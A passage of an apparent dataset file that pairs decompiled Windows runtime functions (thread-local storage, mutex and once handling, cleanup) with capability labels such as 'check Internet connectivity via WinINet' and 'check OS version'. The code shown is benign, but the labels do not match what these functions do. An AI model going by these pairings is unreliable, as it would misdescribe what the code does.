        "decompiled_code": "\nvoid fcn.1400040c0(void)\n\n{\n    int64_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint *puVar6;\n    \n    piVar1 = *0x1400183a0;\n    iVar5 = **0x1400183a0;\n    if (iVar5 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0x30) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.140008fc0();\n            }\n            goto code_r0x000140004170;\n        }\ncode_r0x0001400040e0:\n        puVar6 = 0x140016088;\n        *(iVar5 + 0x30) = 0x140016088;\n    }\n    else {\n        if (*(iVar5 + 0x30) == 0) goto code_r0x0001400040e0;\ncode_r0x000140004170:\n        puVar6 = *(iVar5 + 0x30);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *puVar6 = uVar2;\n    iVar5 = *piVar1;\n    if (iVar5 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0x30) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.140008fc0();\n            }\n            goto code_r0x000140004140;\n        }\n    }\n    else if (*(iVar5 + 0x30) != 0) {\ncode_r0x000140004140:\n        piVar3 = *(iVar5 + 0x30);\n        goto code_r0x000140004110;\n    }\n    *(iVar5 + 0x30) = 0x140016088;\n    piVar3 = 0x140016088;\ncode_r0x000140004110:\n    if (*piVar3 != -1) {\n        return;\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 529
    },
    "14000418": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140004180(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ushort uStack16;\n    uchar uStack14;\n    \n    uStack120 = 0x6c6320726f727245;\n    uStack112 = 0x7520676e696e6165;\n    uStack104 = 0x6b5f6e6970732070;\n    uStack96 = 0x20726f6620737965;\n    uStack88 = 0x20646165726874;\n    uStack80 = 0;\n    uStack72 = 0;\n    uStack64 = 0;\n    uStack56 = 0;\n    uStack48 = 0;\n    uStack40 = 0;\n    uStack32 = 0;\n    uStack24 = 0;\n    uStack16 = 0;\n    uStack14 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    (*_sym.imp.msvcrt.dll__ultoa)(uVar1, &uStack88 + 7, 10);\n    if (uStack88._7_1_ == '\\0') goto code_r0x000140004292;\n    iVar3 = 0x28;\n    while( true ) {\n        iVar2 = iVar3;\n        iVar4 = iVar2;\n        if (*(&uStack120 + iVar3) == '\\0') break;\n        iVar3 = iVar3 + 1;\n        if (iVar3 == 0x6b) goto code_r0x000140004287;\n    }\n    if (iVar2 == 0x6a) goto code_r0x000140004287;\n    iVar2 = iVar2 + 1;\n    do {\n        *(&uStack120 + iVar4) = 10;\n        *(&uStack120 + iVar2) = 0;\ncode_r0x000140004287:\n        (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(&uStack120);\n        sub.msvcrt.dll_abort();\ncode_r0x000140004292:\n        iVar2 = 0x28;\n        iVar4 = 0x27;\n    } while( true );\n}\n",
        "token_count": 585
    },
    "1400042b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1400042b0(int32_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    ulong *puVar9;\n    \n    iVar7 = fcn.140002e60(arg1);\n    fcn.1400095f0(iVar7 + 8);\n    iVar2 = *arg1;\n    if (iVar2 == 0) {\n        fcn.1400040c0();\n        *arg1 = 1;\n    }\n    else if (iVar2 != 1) {\n        uVar8 = (**0x140016110)(2);\n        sub.msvcrt.dll_fprintf(uVar8, \" once %p is %d\\n\", arg1, iVar2);\n    }\n    uVar8 = fcn.140009910(iVar7 + 8);\n    piVar3 = *0x1400183a0;\n    if (iVar7 == 0) {\n        return uVar8;\n    }\n    iVar5 = **0x1400183a0;\n    if (iVar5 == 0) {\n        iVar6 = fcn.140008fc0();\n        iVar5 = *piVar3;\n        if (*(iVar6 + 0x90) == 0) goto code_r0x0001400030a5;\n        if (iVar5 == 0) {\n            iVar5 = fcn.140008fc0();\n        }\ncode_r0x000140003180:\n        fcn.14000ae70(*(iVar5 + 0x90));\n        iVar5 = *piVar3;\n        if (iVar5 != 0) goto code_r0x0001400030c4;\ncode_r0x000140003198:\n        iVar6 = fcn.140008fc0();\n        iVar5 = *piVar3;\n        if (*(iVar6 + 0x88) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.140008fc0();\n            }\n            goto code_r0x0001400030d2;\n        }\ncode_r0x0001400031c0:\n        *(iVar5 + 0x88) = 0x14001b198;\n        piVar4 = 0x14001b198;\n    }\n    else {\n        if (*(iVar5 + 0x90) != 0) goto code_r0x000140003180;\ncode_r0x0001400030a5:\n        *(iVar5 + 0x90) = 0x140016070;\n        fcn.14000ae70(0x140016070);\n        iVar5 = *piVar3;\n        if (iVar5 == 0) goto code_r0x000140003198;\ncode_r0x0001400030c4:\n        if (*(iVar5 + 0x88) == 0) goto code_r0x0001400031c0;\ncode_r0x0001400030d2:\n        piVar4 = *(iVar5 + 0x88);\n    }\n    iVar5 = *piVar4;\n    if ((iVar7 == iVar5) || (iVar5 == 0)) {\n        iVar6 = 0;\n    }\n    else {\n        do {\n            iVar6 = iVar5;\n            iVar5 = *(iVar6 + 0x18);\n            if (iVar5 == 0) goto code_r0x000140003280;\n        } while (iVar7 != iVar5);\n    }\n    if (iVar5 == 0) {\ncode_r0x000140003280:\n        uVar8 = (**0x140016110)(2);\n        sub.msvcrt.dll_fprintf(uVar8, \"%p not found?!?!\\n\", iVar7);\n        goto code_r0x00014000311a;\n    }\n    piVar1 = iVar7 + 0x10;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 != 0) goto code_r0x00014000311a;\n    fcn.140009ae0(iVar7 + 8);\n    if (iVar6 == 0) {\n        iVar5 = *piVar3;\n        if (iVar5 == 0) {\n            iVar6 = fcn.140008fc0();\n            iVar5 = *piVar3;\n            if (*(iVar6 + 0x88) == 0) goto code_r0x000140003253;\n            if (iVar5 == 0) {\n                iVar5 = fcn.140008fc0();\n            }\ncode_r0x0001400032d8:\n            puVar9 = *(iVar5 + 0x88);\n        }\n        else {\n            if (*(iVar5 + 0x88) != 0) goto code_r0x0001400032d8;\ncode_r0x000140003253:\n            *(iVar5 + 0x88) = 0x14001b198;\n            puVar9 = 0x14001b198;\n        }\n        *puVar9 = *(iVar7 + 0x18);\n    }\n    else {\n        *(iVar6 + 0x18) = *(iVar7 + 0x18);\n    }\n    sub.msvcrt.dll_free(iVar7);\ncode_r0x00014000311a:\n    iVar7 = *piVar3;\n    if (iVar7 == 0) {\n        iVar5 = fcn.140008fc0();\n        iVar7 = *piVar3;\n        iVar5 = *(iVar5 + 0x90);\n    }\n    else {\n        iVar5 = *(iVar7 + 0x90);\n    }\n    if (iVar5 == 0) {\n        puVar9 = 0x140016070;\n        *(iVar7 + 0x90) = 0x140016070;\n    }\n    else {\n        if (iVar7 == 0) {\n            iVar7 = fcn.140008fc0();\n        }\n        puVar9 = *(iVar7 + 0x90);\n    }\n    *puVar9 = 0xffffffffffffffff;\n    return 0;\n}\n",
        "token_count": 1369
    },
    "14000433": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.140004330(ulong *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t *arg2;\n    ulong arg1_00;\n    uint64_t uVar7;\n    int32_t **arg1_01;\n    int64_t *piVar8;\n    ulong *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    bool bVar16;\n    \n    piVar1 = *0x1400183a0;\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x60) == 0) goto code_r0x000140004362;\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\ncode_r0x0001400044a0:\n        arg1_00 = *(iVar6 + 0x60);\n    }\n    else {\n        if (*(iVar6 + 0x60) != 0) goto code_r0x0001400044a0;\ncode_r0x000140004362:\n        arg1_00 = 0x140016078;\n        *(iVar6 + 0x60) = 0x140016078;\n    }\n    fcn.1400095f0(arg1_00);\n    uVar7 = arg1[0x3b];\n    if (uVar7 != 0) {\n        iVar6 = *piVar1;\n        if (iVar6 == 0) {\n            iVar4 = fcn.140008fc0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x000140004568;\n            if (iVar6 != 0) goto code_r0x000140004628;\n            iVar6 = fcn.140008fc0();\n            if (**(iVar6 + 0x70) == 0) goto code_r0x000140004382;\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x000140004584;\n            iVar4 = fcn.140008fc0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x000140004780;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n                piVar8 = *(iVar6 + 0x70);\n                iVar6 = *piVar1;\n                goto code_r0x000140004593;\n            }\n        }\n        else {\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x000140004568:\n                *(iVar6 + 0x70) = 0x14001b1b0;\n                piVar8 = 0x14001b1b0;\n            }\n            else {\ncode_r0x000140004628:\n                piVar8 = *(iVar6 + 0x70);\n            }\n            if (*piVar8 == 0) goto code_r0x000140004382;\n            iVar6 = *piVar1;\ncode_r0x000140004584:\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x000140004780:\n                piVar8 = 0x14001b1b0;\n                *(iVar6 + 0x70) = 0x14001b1b0;\n                goto code_r0x000140004593;\n            }\n        }\n        piVar8 = *(iVar6 + 0x70);\ncode_r0x000140004593:\n        uVar13 = 0;\n        uVar15 = *piVar8 - 1;\n        do {\n            uVar11 = uVar13 + uVar15 >> 1;\n            if (iVar6 == 0) {\n                iVar4 = fcn.140008fc0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.140008fc0();\n                    }\n                    goto code_r0x0001400045e1;\n                }\ncode_r0x000140004648:\n                *(iVar6 + 0x68) = 0x14001b1b8;\n                piVar8 = 0x14001b1b8;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x000140004648;\ncode_r0x0001400045e1:\n                piVar8 = *(iVar6 + 0x68);\n                iVar6 = *piVar1;\n            }\n            if (uVar7 == *(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (iVar6 == 0) {\n                    iVar6 = fcn.140008fc0();\n                    if (*(iVar6 + 0x68) == 0) {\n                        iVar6 = *piVar1;\n                        goto code_r0x0001400047a4;\n                    }\ncode_r0x000140004868:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x0001400047b3;\n                    fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    uVar7 = uVar11 + 1;\n                    if (iVar6 != 0) goto code_r0x0001400047b3;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x0001400047be;\n                    if (iVar6 != 0) goto code_r0x000140004a80;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (uVar7 <= **(iVar4 + 0x70) && **(iVar4 + 0x70) != uVar7) {\n                        iVar4 = uVar7 * 0x10;\n                        if (iVar6 != 0) goto code_r0x000140004a8d;\n                        iVar12 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        if (*(iVar12 + 0x70) == 0) goto code_r0x000140004a94;\n                        if (iVar6 != 0) goto code_r0x000140004b02;\n                        iVar12 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        iVar12 = (**(iVar12 + 0x70) - uVar7) * 0x10;\n                        if (iVar6 != 0) goto code_r0x000140004aa9;\n                        iVar14 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        if (*(iVar14 + 0x68) == 0) goto code_r0x000140004b88;\n                        if (iVar6 != 0) goto code_r0x000140004ab4;\n                        iVar14 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        iVar14 = **(iVar14 + 0x68) + iVar4;\n                        if (iVar6 == 0) {\n                            iVar5 = fcn.140008fc0();\n                            iVar6 = *piVar1;\n                            if (*(iVar5 + 0x68) == 0) goto code_r0x000140004bd9;\n                            if (iVar6 == 0) {\n                                iVar6 = fcn.140008fc0();\n                            }\n                            goto code_r0x000140004ac5;\n                        }\n                        if (*(iVar6 + 0x68) != 0) goto code_r0x000140004ac5;\ncode_r0x000140004bd9:\n                        *(iVar6 + 0x68) = 0x14001b1b8;\n                        piVar8 = 0x14001b1b8;\n                        goto code_r0x000140004ac9;\n                    }\ncode_r0x000140004ae0:\n                    if (iVar6 != 0) goto code_r0x0001400047d6;\n                    iVar6 = fcn.140008fc0();\n                    if (*(iVar6 + 0x70) != 0) goto code_r0x000140004970;\n                    iVar6 = *piVar1;\ncode_r0x0001400047e1:\n                    piVar8 = 0x14001b1b0;\n                    *(iVar6 + 0x70) = 0x14001b1b0;\ncode_r0x0001400047ec:\n                    *piVar8 = *piVar8 + -1;\ncode_r0x0001400047f0:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x0001400047fb:\n                        piVar8 = 0x14001b1b0;\n                        *(iVar6 + 0x70) = 0x14001b1b0;\n                    }\n                    else {\ncode_r0x000140004a70:\n                        piVar8 = *(iVar6 + 0x70);\n                    }\n                    if (*piVar8 != 0) break;\ncode_r0x000140004810:\n                    if (*(iVar6 + 0x68) == 0) goto code_r0x000140004bbb;\ncode_r0x00014000481b:\n                    puVar9 = *(iVar6 + 0x68);\n                }\n                else {\n                    if (*(iVar6 + 0x68) != 0) goto code_r0x000140004868;\ncode_r0x0001400047a4:\n                    *(iVar6 + 0x68) = 0x14001b1b8;\ncode_r0x0001400047b3:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x0001400047be:\n                        uVar7 = *0x14001b1b0;\n                        *(iVar6 + 0x70) = 0x14001b1b0;\n                        if (uVar11 + 1 < uVar7) {\ncode_r0x000140004b02:\n                            piVar8 = *(iVar6 + 0x70);\n                            goto code_r0x000140004a9f;\n                        }\n                    }\n                    else {\ncode_r0x000140004a80:\n                        if (uVar11 + 1 < **(iVar6 + 0x70)) {\ncode_r0x000140004a8d:\n                            if (*(iVar6 + 0x70) != 0) goto code_r0x000140004b02;\ncode_r0x000140004a94:\n                            piVar8 = 0x14001b1b0;\n                            *(iVar6 + 0x70) = 0x14001b1b0;\ncode_r0x000140004a9f:\n                            iVar12 = (*piVar8 - (uVar11 + 1)) * 0x10;\ncode_r0x000140004aa9:\n                            if (*(iVar6 + 0x68) == 0) {\ncode_r0x000140004b88:\n                                piVar8 = 0x14001b1b8;\n                                *(iVar6 + 0x68) = 0x14001b1b8;\n                            }\n                            else {\ncode_r0x000140004ab4:\n                                piVar8 = *(iVar6 + 0x68);\n                            }\n                            iVar4 = (uVar11 + 1) * 0x10;\n                            iVar14 = *piVar8 + iVar4;\ncode_r0x000140004ac5:\n                            piVar8 = *(iVar6 + 0x68);\ncode_r0x000140004ac9:\n                            sub.msvcrt.dll_memmove(*piVar8 + -0x10 + iVar4, iVar14, iVar12);\n                            iVar6 = *piVar1;\n                            goto code_r0x000140004ae0;\n                        }\n                    }\ncode_r0x0001400047d6:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x0001400047e1;\ncode_r0x000140004970:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) {\n                        piVar8 = *(iVar6 + 0x70);\n                        goto code_r0x0001400047ec;\n                    }\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    **(iVar4 + 0x70) = **(iVar4 + 0x70) + -1;\n                    if (iVar6 != 0) goto code_r0x0001400047f0;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x0001400047fb;\n                    if (iVar6 != 0) goto code_r0x000140004a70;\n                    iVar6 = fcn.140008fc0();\n                    if (**(iVar6 + 0x70) != 0) break;\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x000140004810;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x68) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.140008fc0();\n                        }\n                        goto code_r0x00014000481b;\n                    }\ncode_r0x000140004bbb:\n                    *(iVar6 + 0x68) = 0x14001b1b8;\n                    puVar9 = 0x14001b1b8;\n                }\n                sub.msvcrt.dll_free(*puVar9);\n                iVar6 = *piVar1;\n                if (iVar6 == 0) {\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x78) == 0) goto code_r0x000140004bab;\n                    if (iVar6 != 0) goto code_r0x00014000483f;\n                    iVar6 = fcn.140008fc0();\n                    puVar9 = *(iVar6 + 0x78);\n                    iVar6 = *piVar1;\n                    *puVar9 = 0;\n                    if (iVar6 != 0) goto code_r0x00014000484a;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.140008fc0();\n                        }\n                        goto code_r0x000140004855;\n                    }\ncode_r0x000140004b98:\n                    *(iVar6 + 0x70) = 0x14001b1b0;\n                    puVar10 = 0x14001b1b0;\n                }\n                else {\n                    if (*(iVar6 + 0x78) == 0) {\ncode_r0x000140004bab:\n                        puVar9 = 0x14001b1a8;\n                        *(iVar6 + 0x78) = 0x14001b1a8;\n                    }\n                    else {\ncode_r0x00014000483f:\n                        puVar9 = *(iVar6 + 0x78);\n                    }\n                    *puVar9 = 0;\ncode_r0x00014000484a:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x000140004b98;\ncode_r0x000140004855:\n                    puVar10 = *(iVar6 + 0x70);\n                }\n                *puVar10 = *puVar9;\n                break;\n            }\n            if (iVar6 == 0) {\n                iVar4 = fcn.140008fc0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.140008fc0();\n                    }\n                    goto code_r0x00014000460e;\n                }\ncode_r0x000140004658:\n                *(iVar6 + 0x68) = 0x14001b1b8;\n                piVar8 = 0x14001b1b8;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x000140004658;\ncode_r0x00014000460e:\n                piVar8 = *(iVar6 + 0x68);\n            }\n            if (uVar7 < *(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (uVar11 == uVar13) break;\n                uVar15 = uVar11 - 1;\n            }\n            else {\n                uVar13 = uVar11 + 1;\n            }\n            if (uVar15 < uVar13) break;\n            iVar6 = *piVar1;\n        } while( true );\n    }\ncode_r0x000140004382:\n    if (arg1[10] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xb] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xc] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    *arg1 = 0;\n    arg1[0x3b] = 0;\n    puVar9 = arg1 + 1 & 0xfffffffffffffff8;\n    for (uVar7 = (arg1 - (arg1 + 1 & 0xfffffffffffffff8)) + 0x1e0U >> 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x0001400043f2;\n        if (iVar6 != 0) goto code_r0x0001400044b0;\n        iVar6 = fcn.140008fc0();\n        if (**(iVar6 + 0x58) == 0) {\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x0001400044be;\n            iVar4 = fcn.140008fc0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x58) == 0) goto code_r0x0001400044c9;\n            if (iVar6 != 0) goto code_r0x000140004638;\n            iVar6 = fcn.140008fc0();\n            puVar9 = *(iVar6 + 0x58);\n            iVar6 = *piVar1;\n            *puVar9 = arg1;\n            if (iVar6 != 0) goto code_r0x0001400044d7;\n            iVar6 = fcn.140008fc0();\n            iVar4 = *(iVar6 + 0x50);\n            iVar6 = *piVar1;\n            goto code_r0x0001400044df;\n        }\n        iVar6 = *piVar1;\n        if (iVar6 != 0) goto code_r0x000140004407;\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x000140004412;\n        if (iVar6 != 0) goto code_r0x000140004520;\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        *(**(iVar4 + 0x58) + 0x1d0) = arg1;\n        if (iVar6 != 0) goto code_r0x000140004427;\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x000140004540;\n        if (iVar6 != 0) goto code_r0x000140004432;\n        iVar6 = fcn.140008fc0();\n        puVar9 = *(iVar6 + 0x58);\n        iVar6 = *piVar1;\n    }\n    else {\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x0001400043f2:\n            *(iVar6 + 0x58) = 0x14001b1c0;\n            iVar4 = *0x14001b1c0;\n        }\n        else {\ncode_r0x0001400044b0:\n            iVar4 = **(iVar6 + 0x58);\n        }\n        if (iVar4 == 0) {\ncode_r0x0001400044be:\n            if (*(iVar6 + 0x58) == 0) {\ncode_r0x0001400044c9:\n                puVar9 = 0x14001b1c0;\n                *(iVar6 + 0x58) = 0x14001b1c0;\n            }\n            else {\ncode_r0x000140004638:\n                puVar9 = *(iVar6 + 0x58);\n            }\n            *puVar9 = arg1;\ncode_r0x0001400044d7:\n            iVar4 = *(iVar6 + 0x50);\ncode_r0x0001400044df:\n            if (iVar4 == 0) {\n                puVar10 = 0x14001b1c8;\n                *(iVar6 + 0x50) = 0x14001b1c8;\n            }\n            else if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n                puVar10 = *(iVar6 + 0x50);\n                iVar6 = *piVar1;\n            }\n            else {\n                puVar10 = *(iVar6 + 0x50);\n            }\n            *puVar10 = *puVar9;\n            goto joined_r0x00014000443c;\n        }\ncode_r0x000140004407:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x000140004412:\n            piVar8 = 0x14001b1c0;\n            *(iVar6 + 0x58) = 0x14001b1c0;\n        }\n        else {\ncode_r0x000140004520:\n            piVar8 = *(iVar6 + 0x58);\n        }\n        *(*piVar8 + 0x1d0) = arg1;\ncode_r0x000140004427:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x000140004540:\n            puVar9 = 0x14001b1c0;\n            *(iVar6 + 0x58) = 0x14001b1c0;\n        }\n        else {\ncode_r0x000140004432:\n            puVar9 = *(iVar6 + 0x58);\n        }\n    }\n    *puVar9 = arg1;\njoined_r0x00014000443c:\n    if (iVar6 == 0) {\n        iVar6 = fcn.140008fc0();\n        iVar4 = *(iVar6 + 0x60);\n        iVar6 = *piVar1;\n    }\n    else {\n        iVar4 = *(iVar6 + 0x60);\n    }\n    if (iVar4 == 0) {\n        arg1_01 = 0x140016078;\n        *(iVar6 + 0x60) = 0x140016078;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\n        arg1_01 = *(iVar6 + 0x60);\n    }\n    arg2 = *arg1_01;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.140009570(arg1_01, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    if (arg2[1] != 0) {\n        if (*arg2 == 0) {\n            return 0x16;\n        }\n        iVar3 = arg2[5];\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar3 != iVar2) {\n            return true;\n        }\n        if (arg2[4] != 0) {\n            arg2[4] = arg2[4] + -1;\n            return false;\n        }\n        arg2[5] = -1;\n    }\n    iVar3 = *arg2;\n    *arg2 = 0;\n    bVar16 = false;\n    if (iVar3 == 2) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2 + 2));\n        bVar16 = iVar3 == 0;\n    }\n    return bVar16;\n}\n",
        "token_count": 5741
    },
    "140004c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140004c80(ulong *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t in_RAX;\n    int32_t *arg2;\n    ulong arg1_00;\n    uint64_t uVar7;\n    int32_t **arg1_01;\n    int64_t *piVar8;\n    ulong *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    \n    piVar1 = *0x1400183a0;\n    if ((arg1 == NULL) || (arg1[0x3a] != 0)) {\n        return in_RAX;\n    }\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x60) == 0) goto code_r0x000140004362;\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\ncode_r0x0001400044a0:\n        arg1_00 = *(iVar6 + 0x60);\n    }\n    else {\n        if (*(iVar6 + 0x60) != 0) goto code_r0x0001400044a0;\ncode_r0x000140004362:\n        arg1_00 = 0x140016078;\n        *(iVar6 + 0x60) = 0x140016078;\n    }\n    fcn.1400095f0(arg1_00);\n    uVar7 = arg1[0x3b];\n    if (uVar7 != 0) {\n        iVar6 = *piVar1;\n        if (iVar6 == 0) {\n            iVar4 = fcn.140008fc0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x000140004568;\n            if (iVar6 != 0) goto code_r0x000140004628;\n            iVar6 = fcn.140008fc0();\n            if (**(iVar6 + 0x70) == 0) goto code_r0x000140004382;\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x000140004584;\n            iVar4 = fcn.140008fc0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x000140004780;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n                piVar8 = *(iVar6 + 0x70);\n                iVar6 = *piVar1;\n                goto code_r0x000140004593;\n            }\n        }\n        else {\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x000140004568:\n                *(iVar6 + 0x70) = 0x14001b1b0;\n                piVar8 = 0x14001b1b0;\n            }\n            else {\ncode_r0x000140004628:\n                piVar8 = *(iVar6 + 0x70);\n            }\n            if (*piVar8 == 0) goto code_r0x000140004382;\n            iVar6 = *piVar1;\ncode_r0x000140004584:\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x000140004780:\n                piVar8 = 0x14001b1b0;\n                *(iVar6 + 0x70) = 0x14001b1b0;\n                goto code_r0x000140004593;\n            }\n        }\n        piVar8 = *(iVar6 + 0x70);\ncode_r0x000140004593:\n        uVar13 = 0;\n        uVar15 = *piVar8 - 1;\n        do {\n            uVar11 = uVar13 + uVar15 >> 1;\n            if (iVar6 == 0) {\n                iVar4 = fcn.140008fc0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.140008fc0();\n                    }\n                    goto code_r0x0001400045e1;\n                }\ncode_r0x000140004648:\n                *(iVar6 + 0x68) = 0x14001b1b8;\n                piVar8 = 0x14001b1b8;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x000140004648;\ncode_r0x0001400045e1:\n                piVar8 = *(iVar6 + 0x68);\n                iVar6 = *piVar1;\n            }\n            if (uVar7 == 